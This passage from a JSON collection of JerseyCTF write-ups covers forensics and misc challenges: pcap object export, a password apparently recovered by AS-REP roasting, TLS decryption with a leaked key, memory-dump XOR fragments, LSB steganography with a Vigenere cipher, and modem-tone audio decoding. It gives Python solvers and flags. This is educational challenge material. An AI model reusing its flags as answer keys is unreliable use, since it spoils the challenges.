        "code": "... jctf{roasted_galatic_invaders}"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "galaga_galaxy_invaders2.pcap\n          |\n          v\ntshark export SMB objects\n          |\n          v\nfound clues + encrypted blobs (ideas1/ideas2)\n          |\n          v\nAS-REP roast -> crack password (galagalogz)\n          |\n          v\nXOR decrypt with SHA256(password)\n          |\n          v\noffset sync on ideas2 (offset 10)\n          |\n          v\njctf{roasted_galatic_invaders}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport hashlib\r\nimport re\r\nimport shutil\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\nfrom pathlib import Path\r\n\r\nFLAG_RE = re.compile(r\"jctf\\{[^\\n\\r\\t\\x00}]+\\}\")\r\n\r\n\r\ndef run(cmd):\r\n    p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\r\n    if p.returncode != 0:\r\n        raise RuntimeError(f\"Command failed: {' '.join(cmd)}\\n{p.stderr}\")\r\n    return p.stdout\r\n\r\n\r\ndef read_text(path: Path) -> str:\r\n    return path.read_text(encoding=\"utf-8\", errors=\"ignore\").strip()\r\n\r\n\r\ndef xor_sha256_hex(hex_blob: str, password: str, offset: int = 0) -> bytes:\r\n    key = hashlib.sha256(password.encode()).digest()\r\n    data = bytes.fromhex(hex_blob.strip())\r\n    return bytes(b ^ key[(i + offset) % 32] for i, b in enumerate(data))\r\n\r\n\r\ndef pick_file(base: Path, names):\r\n    for n in names:\r\n        p = base / n\r\n        if p.exists():\r\n            return p\r\n    return None\r\n\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser(description=\"Solve JerseyCTF Galaga Archive\")\r\n    ap.add_argument(\"pcap\", nargs=\"?\", default=\"galaga_galaxy_invaders2.pcap\")\r\n    args = ap.parse_args()\r\n\r\n    pcap = Path(args.pcap)\r\n    if not pcap.exists():\r\n        print(f\"[!] PCAP not found: {pcap}\")\r\n        sys.exit(1)\r\n\r\n    if shutil.which(\"tshark\") is None:\r\n        print(\"[!] tshark not found. Install Wireshark/tshark first.\")\r\n        sys.exit(1)\r\n\r\n    with tempfile.TemporaryDirectory(prefix=\"galaga_objs_\") as td:\r\n        outdir = Path(td)\r\n        run([\"tshark\", \"-r\", str(pcap), \"--export-objects\", f\"smb,{outdir}\"])\r\n\r\n        ideas1 = pick_file(outdir, [\"%5cideas1.txt\", \"ideas1.txt\", \"\\\\ideas1.txt\"])\r\n        ideas2 = pick_file(outdir, [\"%5cideas2.txt\", \"ideas2.txt\", \"\\\\ideas2.txt\"])\r\n\r\n        if not ideas1 or not ideas2:\r\n            print(\"[!] ideas1.txt / ideas2.txt not found in SMB exported objects\")\r\n            sys.exit(1)\r\n\r\n        # Recovered credential from AS-REP roast on user galatic\r\n        password = \"galagalogz\"\r\n\r\n        pt1 = xor_sha256_hex(read_text(ideas1), password, 0)\r\n        if b\"cool! here is my update\" in pt1.lower():\r\n            print(\"[+] Decrypted ideas1 successfully\")\r\n        else:\r\n            print(\"[!] ideas1 plaintext check failed, continuing anyway\")\r\n\r\n        found = None\r\n        for off in range(32):\r\n            pt2 = xor_sha256_hex(read_text(ideas2), password, off)\r\n            m = FLAG_RE.search(pt2.decode(\"utf-8\", errors=\"ignore\"))\r\n            if m:\r\n                found = m.group(0)\r\n                break\r\n\r\n        if not found:\r\n            print(\"[!] Flag not found\")\r\n            sys.exit(2)\r\n\r\n        print(found)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{roasted_galatic_invaders}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-neptuneauthority",
    "title": "CTF — Neptune Authority",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics / Network Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{48173926}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | HTTP Object Recovery | Mengambil file terenkripsi dari PCAP (`ods.crt.enc`, `ods.key.enc`) |\n| 2 | Key Material Recovery | Password bocor di header HTTP (`X-Orbit-Note: oldorbit`) |\n| 3 | TLS Decryption | Private key dipakai untuk decrypt TLS stream 8443 |\n| 4 | Sensitive Data Exposure | Kode shutdown terkirim jelas di HTTP response dalam sesi TLS terdekripsi |\n\n---",
    "tools": [
      "tshark",
      "openssl",
      "Python ("
    ],
    "analysis": "```bash\nfile neptune-defense.pcap\n\ncapinfos neptune-defense.pcap\n```",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A network capture from Neptune's orbital defense perimeter shows the system entering escalation mode after the relay network reawakened. A shutdown authorization was transmitted over an encrypted channel before the perimeter locked down. Recover the materials needed to decrypt the exchange and stop the quarantine from closing around you.\n\n**File:** `neptune-defense.pcap` (264 KB)\n\n---"
      },
      {
        "title": "Step 2 — Protocol Triage",
        "content": "Protokol utama yang muncul:\n- `http` (trafik ke `10.20.0.99:8080`)\n- `tls` (trafik ke `10.20.0.50:8443`)\n- `icmp` heartbeat/ping berkala",
        "code": "tshark -r neptune-defense.pcap -q -z io,phs"
      },
      {
        "title": "Step 3 — Cari Artefak HTTP Penting",
        "content": "Ditemukan request menarik:\n- `/ods.crt.enc`\n- `/ods.key.enc`\n\nKeduanya di-download dari server internal `10.20.0.99:8080`.\n\n---",
        "code": "tshark -r neptune-defense.pcap -Y \"http.request\" -T fields -e frame.number -e tcp.stream -e http.request.uri"
      },
      {
        "title": "Step 4 — Export Object HTTP",
        "content": "Hasil:\n- `ods.crt.enc` -> OpenSSL encrypted blob\n- `ods.key.enc` -> OpenSSL encrypted blob\n\nJadi challenge ini butuh dekripsi material TLS dulu.",
        "code": "tshark -r neptune-defense.pcap --export-objects http,http_objects\nfile http_objects/ods.crt.enc http_objects/ods.key.enc"
      },
      {
        "title": "Step 5 — Ambil Password Enkripsi",
        "content": "Saat inspeksi response HTTP `200` untuk kedua file itu, ada header custom:\n\n\n\nHeader ini dipakai sebagai passphrase file enkripsi.",
        "code": "X-Orbit-Note: oldorbit"
      },
      {
        "title": "Step 6 — Dekripsi Certificate + Private Key",
        "content": "Output:\n- `ods.crt` -> PEM certificate\n- `ods.key` -> RSA private key",
        "code": "openssl enc -d -aes-256-cbc -in http_objects/ods.crt.enc -pass pass:oldorbit -out ods.crt\nopenssl enc -d -aes-256-cbc -in http_objects/ods.key.enc -pass pass:oldorbit -out ods.key"
      },
      {
        "title": "Step 7 — Dekripsi Channel TLS 8443",
        "content": "Dari TLS plaintext/debug, muncul response HTTP yang berisi:\n\n\n\nNilai `SHUTDOWN_CODE` adalah komponen flag.\n\n---",
        "code": "tshark -r neptune-defense.pcap \\\n  -o \"tls.keys_list:10.20.0.50,8443,http,ods.key\" \\\n  -o \"tls.debug_file:tlsdebug.txt\" \\\n  -Y \"tcp.stream==71\""
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "neptune-defense.pcap\n      |\n      +--> HTTP object export\n      |      |\n      |      +--> ods.crt.enc + ods.key.enc\n      |      |\n      |      +--> X-Orbit-Note: oldorbit\n      |             |\n      |             +--> decrypt cert/key via openssl\n      |\n      +--> TLS stream 10.20.0.50:8443\n             |\n             +--> decrypt with ods.key\n                    |\n                    +--> SHUTDOWN_CODE: 48173926\n                           |\n                           +--> jctf{48173926}"
      },
      {
        "title": "Installation",
        "content": "",
        "code": "sudo apt update\nsudo apt install -y tshark openssl python3\n\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport pathlib\r\nimport re\r\nimport shutil\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\n\r\nPCAP_DEFAULT = \"neptune-defense.pcap\"\r\n\r\n\r\ndef run(cmd):\r\n    return subprocess.run(cmd, check=True, capture_output=True, text=True)\r\n\r\n\r\ndef need_tool(name):\r\n    if shutil.which(name) is None:\r\n        raise RuntimeError(f\"Tool tidak ditemukan di PATH: {name}\")\r\n\r\n\r\ndef extract_orbit_note(pcap):\r\n    cmd = [\r\n        \"tshark\", \"-r\", str(pcap),\r\n        \"-Y\", \"http.response.code==200\",\r\n        \"-V\",\r\n    ]\r\n    out = run(cmd).stdout\r\n    m = re.search(r\"X-Orbit-Note:\\s*([^\\r\\n]+)\", out)\r\n    if not m:\r\n        raise RuntimeError(\"Gagal menemukan header X-Orbit-Note di trafik HTTP 200\")\r\n    note = m.group(1)\r\n    note = note.replace(\"\\\\r\", \"\").replace(\"\\\\n\", \"\").strip()\r\n    return note\r\n\r\n\r\ndef decrypt_file(inp, outp, password):\r\n    cmd = [\r\n        \"openssl\", \"enc\", \"-d\", \"-aes-256-cbc\",\r\n        \"-in\", str(inp),\r\n        \"-pass\", f\"pass:{password}\",\r\n        \"-out\", str(outp),\r\n    ]\r\n    # warning dari openssl tetap ditoleransi, yang penting exit code 0\r\n    subprocess.run(cmd, check=True, capture_output=True, text=True)\r\n\r\n\r\ndef extract_shutdown_code_from_tls_debug(debug_path):\r\n    data = bytearray()\r\n    hex_line = re.compile(r\"^\\|\\s*([0-9a-f]{2}(?:\\s+[0-9a-f]{2})*)\\s*\\|\", re.IGNORECASE)\r\n\r\n    for line in debug_path.read_text(errors=\"ignore\").splitlines():\r\n        m = hex_line.match(line)\r\n        if not m:\r\n            continue\r\n        hx = m.group(1).replace(\" \", \"\")\r\n        if len(hx) % 2:\r\n            continue\r\n        try:\r\n            data.extend(bytes.fromhex(hx))\r\n        except ValueError:\r\n            pass\r\n\r\n    text = data.decode(\"latin1\", errors=\"ignore\")\r\n    m = re.search(r\"SHUTDOWN_CODE:\\s*(\\d+)\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Gagal menemukan SHUTDOWN_CODE dari TLS debug output\")\r\n    return m.group(1)\r\n\r\n\r\ndef main():\r\n    need_tool(\"tshark\")\r\n    need_tool(\"openssl\")\r\n\r\n    pcap = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else PCAP_DEFAULT)\r\n    if not pcap.exists():\r\n        raise FileNotFoundError(f\"PCAP tidak ditemukan: {pcap}\")\r\n\r\n    with tempfile.TemporaryDirectory(prefix=\"na_solve_\", dir=\".\") as td:\r\n        td = pathlib.Path(td)\r\n        http_dir = td / \"http_objects\"\r\n        http_dir.mkdir(parents=True, exist_ok=True)\r\n\r\n        # 1) export HTTP objects\r\n        run([\"tshark\", \"-r\", str(pcap), \"--export-objects\", f\"http,{http_dir}\"])\r\n\r\n        crt_enc = http_dir / \"ods.crt.enc\"\r\n        key_enc = http_dir / \"ods.key.enc\"\r\n        if not crt_enc.exists() or not key_enc.exists():\r\n            raise RuntimeError(\"ods.crt.enc / ods.key.enc tidak ditemukan dari export objek HTTP\")\r\n\r\n        # 2) ambil passphrase dari header response\r\n        orbit_note = extract_orbit_note(pcap)\r\n\r\n        # 3) decrypt cert + key\r\n        crt = td / \"ods.crt\"\r\n        key = td / \"ods.key\"\r\n        decrypt_file(crt_enc, crt, orbit_note)\r\n        decrypt_file(key_enc, key, orbit_note)\r\n\r\n        # 4) decrypt TLS stream & dump debug\r\n        debug_file = td / \"tlsdebug.txt\"\r\n        run([\r\n            \"tshark\", \"-r\", str(pcap),\r\n            \"-o\", f\"tls.keys_list:10.20.0.50,8443,http,{key}\",\r\n            \"-o\", f\"tls.debug_file:{debug_file}\",\r\n            \"-Y\", \"tcp.stream==71\",\r\n        ])\r\n\r\n        shutdown_code = extract_shutdown_code_from_tls_debug(debug_file)\r\n        flag = f\"jctf{{{shutdown_code}}}\"\r\n        print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{48173926}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-saturncolony",
    "title": "CTF — Saturn Colony",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{S4turn_Sh4rd_R3v3al_2026}`",
    "problemDescription": "| # | Finding | Detail |\n|---|---|---|\n| 1 | Decoy Process | `jump_authorizer` hanya memproduksi output acak untuk menyesatkan |\n| 2 | Memory-only Fragments | Fragmen key tidak disimpan jelas di disk, tetapi ada di volatile memory proses module |\n| 3 | Lightweight Obfuscation | Fragment disamarkan dengan XOR `0x5A`, mudah dibuka setelah pola terlihat |\n| 4 | Split-Key Design | Key AES-256 dipecah ke 5 module (`1/5` s.d. `5/5`) |\n\n---",
    "tools": [
      "volatility3",
      "strings",
      "Python — deobfuscation + key reconstruction + decryption"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A remote research station designated Saturn has gone silent, but not before transmitting a full memory dump and an encrypted payload. The station ran five colony modules - mercury, venus, earth, mars, and jupiter - each holding part of a critical jump authorization key in volatile memory. Recover the fragments, reconstruct the key, and learn where the surviving route leads next.\n\n**Artifacts:** `saturn.lime`, `payload.enc`, `iv.hex`\n\n---"
      },
      {
        "title": "Step 1 — Identify Main Artifacts",
        "content": "Awal analisis dilakukan ke tiga artefak utama:\n\n- `saturn.lime` → full memory dump\n- `payload.enc` → ciphertext target\n- `iv.hex` → IV AES\n\nDi memory dump ditemukan proses terkait colony modules:\n\n- `mercury`\n- `venus`\n- `earth`\n- `mars`\n- `jupiter`\n\nSerta proses `jump_authorizer`."
      },
      {
        "title": "Step 2 — Validate Decoy Binary",
        "content": "`jump_authorizer` sempat terlihat mencetak string seperti fragment/key, tapi setelah direview binary-nya, itu hanya generator decoy (random output), bukan sumber key asli.\n\nArtinya, fokus dipindah ke memori proses Python module."
      },
      {
        "title": "Step 3 — Hunt Strings Per-Module",
        "content": "Dump VMA per PID untuk 5 module dibandingkan secara diferensial (unique string antar-module). Dari sini muncul pola string obfuscated yang konsisten:\n\n- Mercury: ````7?(9/(#``kuo``l>>oho8b<9n;``\n- Venus: ```` ,?4/)``huo``;8n>ljjo>8kh``\n- Earth: ````?;(.2``iuo``okk9kii?<8<>``\n- Mars: ````7;()``nuo``?m>cm9k>8>?l``\n- Jupiter: ````0/*3.?(``ouo``cl8?hm8jbcbo?8lk``\n\nPola ini sangat mencurigakan karena struktur antar-module mirip, hanya kontennya yang beda.\n\n---"
      },
      {
        "title": "Step 4 — Deobfuscation",
        "content": "Dilakukan uji transformasi sederhana (XOR, ROT, dsb). XOR dengan `0x5A` langsung menghasilkan format yang sangat jelas:\n\n- `::mercury::1/5::6dd525b8fc4a`\n- `::venus::2/5::ab4d6005db12`\n- `::earth::3/5::511c133efbfd`\n- `::mars::4/5::e7d97c1dbde6`\n- `::jupiter::5/5::96be27b08985eb61`"
      },
      {
        "title": "Step 5 — Reconstruct AES Key",
        "content": "Gabungkan fragment sesuai urutan `i/5`:\n\n\n\nHasilnya 64 hex char = 32 byte (AES-256 key).",
        "code": "6dd525b8fc4a + ab4d6005db12 + 511c133efbfd + e7d97c1dbde6 + 96be27b08985eb61\n= 6dd525b8fc4aab4d6005db12511c133efbfde7d97c1dbde696be27b08985eb61"
      },
      {
        "title": "Step 6 — Decrypt Payload",
        "content": "Mode dari challenge hint dan validasi hasil:\n\n- Algorithm: `AES-256-CBC`\n- Key: hasil gabungan 5 fragment\n- IV: dari `iv.hex`\n- Ciphertext: `payload.enc`\n\nDecryption + PKCS#7 unpad menghasilkan:\n\n\n\n---",
        "code": "jctf{S4turn_Sh4rd_R3v3al_2026}"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Analyze memory dump (saturn.lime)\n        │\n        ▼\nIdentify 5 module processes + jump_authorizer\n        │\n        ▼\nDiscard jump_authorizer as decoy\n        │\n        ▼\nExtract unique obfuscated strings from each module memory\n        │\n        ▼\nXOR 0x5A -> reveal fragments ::module::i/5::<hex>\n        │\n        ▼\nConcatenate fragments in order 1..5 -> AES-256 key\n        │\n        ▼\nDecrypt payload.enc with AES-256-CBC + iv.hex\n        │\n        ▼\njctf{S4turn_Sh4rd_R3v3al_2026}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\n\r\n# Recovered obfuscated fragments from memory (one per colony module)\r\nOBFUSCATED = {\r\n    \"mercury\": \"``7?(9/(#``kuo``l>>oho8b<9n;\",\r\n    \"venus\": \"``,?4/)``huo``;8n>ljjo>8kh\",\r\n    \"earth\": \"``?;(.2``iuo``okk9kii?<8<>\",\r\n    \"mars\": \"``7;()``nuo``?m>cm9k>8>?l\",\r\n    \"jupiter\": \"``0/*3.?(``ouo``cl8?hm8jbcbo?8lk\",\r\n}\r\n\r\n# Challenge artifacts (inlined so solver still works after cleanup)\r\nIV_HEX = \"98ba2cc716d1e9fb865428b59fae7ead\"\r\nPAYLOAD_HEX = \"63d53b74b9f15ea0c8a9f6f005f6ef6d22fedf17f6fcb4b5e6a0f0a80522d250\"\r\n\r\n\r\ndef deobfuscate(s: str) -> str:\r\n    return \"\".join(chr(ord(c) ^ 0x5A) for c in s)\r\n\r\n\r\ndef extract_hex_fragment(decoded: str) -> str:\r\n    # decoded format example: ::venus::2/5::ab4d6005db12\r\n    return decoded.split(\"::\")[-1]\r\n\r\n\r\ndef main() -> None:\r\n    decoded = {k: deobfuscate(v) for k, v in OBFUSCATED.items()}\r\n\r\n    # Order from i/5 marker found in decoded strings\r\n    # 1/5 mercury, 2/5 venus, 3/5 earth, 4/5 mars, 5/5 jupiter\r\n    key_hex = (\r\n        extract_hex_fragment(decoded[\"mercury\"])\r\n        + extract_hex_fragment(decoded[\"venus\"])\r\n        + extract_hex_fragment(decoded[\"earth\"])\r\n        + extract_hex_fragment(decoded[\"mars\"])\r\n        + extract_hex_fragment(decoded[\"jupiter\"])\r\n    )\r\n\r\n    key = bytes.fromhex(key_hex)\r\n    iv = bytes.fromhex(IV_HEX)\r\n    ct = bytes.fromhex(PAYLOAD_HEX)\r\n\r\n    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)\r\n    flag = unpad(pt, 16).decode()\r\n\r\n    print(\"[+] Recovered key:\", key_hex)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{S4turn_Sh4rd_R3v3al_2026}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-spaceman",
    "title": "CTF — Space Man",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics / Steganography  \n**Difficulty:** Medium  \n**Flag:** `jctf{we_choose_to_go_to_the_moon}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **LSB Steganography** | Message hidden in least significant bits of RGB pixel channels |\n| 2 | **Vigenere Cipher** | Encoded text encrypted with repeating key `gemini` |\n\n---",
    "tools": [
      "binwalk",
      "zsteg",
      "Python — Vigenere cipher decryption + key brute force"
    ],
    "analysis": "```bash\nfile space_man.png\n\nexiftool space_man.png\n```",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The world witnessed the space race in the 1960s, a battle between two superpowers to see who could reach the Moon first. Our agents have uncovered this image behind enemy lines. There might be some good intel within. We think the key is one of the most important space projects that paved the way for us to get to the Moon. One of their missions was pretty scary, though. Thank goodness the crew knew how to handle the dizzying situation.\n\n**File:** `space_man.png` (1812x1272, RGBA, 1.6 MB)\n\n---"
      },
      {
        "title": "Step 2 — Binwalk",
        "content": "Reveals many embedded Zlib compressed data blocks — consistent with a large PNG's internal IDAT chunks. No separate hidden file is appended. This rules out file-within-file steganography and points toward **LSB (Least Significant Bit) pixel steganography**.",
        "code": "binwalk space_man.png"
      },
      {
        "title": "Step 3 — Decode the Hint",
        "content": "The challenge description contains layered hints:\n\n| Hint | Meaning |\n|---|---|\n| \"most important space projects that paved the way to the Moon\" | **Project Gemini** — NASA's bridge between Mercury and Apollo |\n| \"one of their missions was pretty scary\" | **Gemini 8** — spacecraft went into uncontrolled spin |\n| \"crew knew how to handle the dizzying situation\" | Neil Armstrong manually fired thrusters to stop the spin |\n| \"key is one of the most important space projects\" | The Vigenere key = **`gemini`** |\n\n---"
      },
      {
        "title": "Step 4 — LSB Steganography with zsteg",
        "content": "Key output line:\n\n\nThe `b1,rgb,lsb,xy` channel (1 bit, RGB channels, least significant bit, left-to-right scan) contains an encoded string. The format `pgfn{...}` clearly mirrors a flag format like `jctf{...}`, confirming it's a **substitution cipher**.",
        "code": "zsteg space_man.png"
      },
      {
        "title": "Step 5 — Identify the Cipher",
        "content": "Testing a simple ROT shift shows inconsistent offsets between characters:\n- `p → j`: shift −6\n- `g → c`: shift −4\n- `f → t`: shift +14\n\nInconsistent single shifts = **Vigenere cipher** (polyalphabetic substitution using a repeating key)."
      },
      {
        "title": "Step 6 — Vigenere Decryption",
        "content": "Using key `gemini`:\n\n\n\nThe decrypted flag references JFK's famous 1962 speech:\n> *\"We choose to go to the Moon in this decade and do the other things, not because they are easy, but because they are hard.\"*\n\n---",
        "code": "def vigenere_decrypt(ciphertext, key):\n    key_chars = [c for c in key.lower() if c.isalpha()]\n    result = ''\n    ki = 0\n    for c in ciphertext:\n        if c.isalpha():\n            shift = ord(key_chars[ki % len(key_chars)]) - ord('a')\n            base  = ord('a') if c.islower() else ord('A')\n            result += chr((ord(c) - base - shift) % 26 + base)\n            ki += 1\n        else:\n            result += c\n    return result\n\nvigenere_decrypt(\"pgfn{jm_ilawfm_zs_sw_gw_zlq_ubwt}\", \"gemini\")"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "space_man.png\n      │\n      ▼\nzsteg (b1,rgb,lsb,xy)\n      │\n      ▼\n\"pgfn{jm_ilawfm_zs_sw_gw_zlq_ubwt}\"\n      │\n      ▼\nHint: \"key = most important space project\" → gemini\n      │\n      ▼\nVigenere decrypt(key=\"gemini\")\n      │\n      ▼\njctf{we_choose_to_go_to_the_moon}"
      },
      {
        "title": "Installation",
        "content": "",
        "code": "gem install zsteg\n\npython3 solve_space_man.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nCTF Solver: Space Man - JerseyCTF\r\nCategory: Forensics / Steganography\r\nTechnique: LSB steganography (zsteg) → Vigenere cipher decryption\r\nKey: 'gemini' (Project Gemini — paved the way to the Moon)\r\n\"\"\"\r\n\r\nimport subprocess\r\nimport re\r\n\r\nIMAGE = \"space_man.png\"\r\n\r\n# ─── Step 1: Extract LSB data via zsteg ───────────────────────────────────────\r\ndef extract_lsb(image):\r\n    result = subprocess.run(\r\n        [\"zsteg\", image],\r\n        capture_output=True, text=True\r\n    )\r\n    # Look for text pattern in b1,rgb,lsb,xy channel\r\n    for line in result.stdout.splitlines():\r\n        if \"b1,rgb,lsb,xy\" in line and \"text:\" in line:\r\n            match = re.search(r'\"([^\"]+)\"', line)\r\n            if match:\r\n                return match.group(1)\r\n    return None\r\n\r\n# ─── Step 2: Vigenere Decrypt ─────────────────────────────────────────────────\r\ndef vigenere_decrypt(ciphertext, key):\r\n    key_chars = [c for c in key.lower() if c.isalpha()]\r\n    result = ''\r\n    ki = 0\r\n    for c in ciphertext:\r\n        if c.isalpha():\r\n            shift = ord(key_chars[ki % len(key_chars)]) - ord('a')\r\n            base  = ord('a') if c.islower() else ord('A')\r\n            result += chr((ord(c) - base - shift) % 26 + base)\r\n            ki += 1\r\n        else:\r\n            result += c\r\n    return result\r\n\r\n# ─── Step 3: Brute-force key (optional fallback) ──────────────────────────────\r\ndef brute_vigenere(ciphertext):\r\n    candidates = [\r\n        'gemini', 'gemini8', 'apollo', 'mercury', 'vostok',\r\n        'saturn', 'armstrong', 'neil', 'moon', 'nasa',\r\n        'projectgemini', 'projectapollo', 'projectmercury',\r\n    ]\r\n    for key in candidates:\r\n        result = vigenere_decrypt(ciphertext, key)\r\n        if result.startswith('flag{') or result.startswith('jctf{'):\r\n            return result, key\r\n    return None, None\r\n\r\n# ─── Main ─────────────────────────────────────────────────────────────────────\r\ndef main():\r\n    print(\"=\" * 55)\r\n    print(\"  Space Man — Steganography + Vigenere Solver\")\r\n    print(\"=\" * 55)\r\n\r\n    # Step 1: Extract LSB\r\n    print(f\"\\n[1] Extracting LSB data from: {IMAGE}\")\r\n    encoded = extract_lsb(IMAGE)\r\n\r\n    if not encoded:\r\n        print(\"    [!] zsteg failed or not installed. Using known value...\")\r\n        encoded = \"pgfn{jm_ilawfm_zs_sw_gw_zlq_ubwt}\"\r\n\r\n    print(f\"    Extracted: {encoded}\")\r\n\r\n    # Step 2: Decrypt with known key\r\n    KEY = \"gemini\"\r\n    print(f\"\\n[2] Vigenere decrypt with key: '{KEY}'\")\r\n    flag = vigenere_decrypt(encoded, KEY)\r\n    print(f\"    Decrypted: {flag}\")\r\n\r\n    # Verify\r\n    if not (flag.startswith('flag{') or flag.startswith('jctf{')):\r\n        print(\"\\n[!] Known key failed — brute forcing...\")\r\n        flag, KEY = brute_vigenere(encoded)\r\n        if flag:\r\n            print(f\"    Found with key='{KEY}': {flag}\")\r\n        else:\r\n            print(\"    [!] Brute force failed. Try more keys.\")\r\n            return\r\n\r\n    print(\"\\n\" + \"=\" * 55)\r\n    print(f\"  FLAG: {flag}\")\r\n    print(\"=\" * 55)\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{we_choose_to_go_to_the_moon}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-misc-recoveredtape",
    "title": "CTF — Recovered Tape",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Misc  \n**Difficulty:** Medium  \n**Flag:** `jctf{buy_0ne_g3t_0ne_fr33}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | Audio signal analysis | Spectrogram dipakai buat nemuin area sinyal tersembunyi |\n| 2 | Channel isolation | Payload ada di channel kanan, bukan stereo campur |\n| 3 | Legacy modem decoding | Tone 1200/2400 + hint Kansas City = KCS-style decoding |\n\n---",
    "tools": [
      "sox",
      "minimodem",
      "xxd"
    ],
    "analysis": "Gue generate spectrogram untuk full audio dan per-channel:\n\n```bash\nsox clip.wav -n spectrogram -o spectrogram_full.png\nsox clip.wav -n remix 1 spectrogram -o spectrogram_left.png\nsox clip.wav -n remix 2 spectrogram -o spectrogram_right.png\n```\n\nTemuan penting:\n- Di **channel kanan** ada blok sinyal yang sangat mencurigakan sekitar detik **7.7 sampai 10.0**.\n- Bentuknya bukan suara manusia; lebih mirip data tone digital (modem lama).",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A shopping mall in Kansas City finally retired their '80s PA system, originally designed to work alongside looped music tapes for sale announcements. They want to archive its contents but can't figure out the messages. A short clip was salvaged from one of them.\n\n**File:** `clip.wav`\n\n---"
      },
      {
        "title": "Step 1 — Cek file dasar",
        "content": "Pertama gue cek metadata file:\n\n\n\nHasilnya:\n- WAV PCM 16-bit, stereo, 44.1 kHz\n- Durasi sekitar 17.5 detik\n\nJadi ini bukan file aneh/arsip bertingkat, tapi audio biasa yang kemungkinan ada data tersembunyi di dalam sinyalnya.",
        "code": "file clip.wav\nsoxi clip.wav"
      },
      {
        "title": "Step 3 — Ambil segmen sinyal data",
        "content": "Gue fokus ke potongan ini karena jelas paling \"non-musikal\" dan konsisten seperti payload.",
        "code": "sox clip.wav right.wav remix 2\nsox right.wav signal.wav trim 7.7 '=10.0'"
      },
      {
        "title": "Step 4 — Identifikasi petunjuk frekuensi",
        "content": "Dari visual spectrogram, muncul pasangan tone sekitar **1200 Hz** dan **2400 Hz**.\n\nDi deskripsi challenge ada kata kunci **Kansas City**, yang langsung ngarah ke **Kansas City Standard (KCS)** untuk penyimpanan data di tape (era komputer lama).\n\nKCS umumnya pakai:\n- 300 baud\n- tone 1200/2400 Hz\n\n---"
      },
      {
        "title": "Step 5 — Decode dengan minimodem (KCS-like params)",
        "content": "Jalankan decode serial tone dengan parameter KCS:\n\n\n\nOutput hex yang kebaca:\n\n\n\nDecode ASCII-nya jadi:\n\n\n\nByte `ff` di ujung cuma noise/terminator tambahan, bukan bagian flag.\n\n---",
        "code": "minimodem --rx -f signal.wav 300 -M 2400 -S 1200 --startbits 1 --stopbits 2 -8 -q | xxd -p"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Inspect WAV metadata\n        |\n        v\nGenerate per-channel spectrogram\n        |\n        v\nFind suspicious tone block in right channel (7.7s–10.0s)\n        |\n        v\nExtract and trim signal segment\n        |\n        v\nMap hint \"Kansas City\" -> Kansas City Standard (1200/2400, 300 baud)\n        |\n        v\nDecode with minimodem\n        |\n        v\njctf{buy_0ne_g3t_0ne_fr33}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
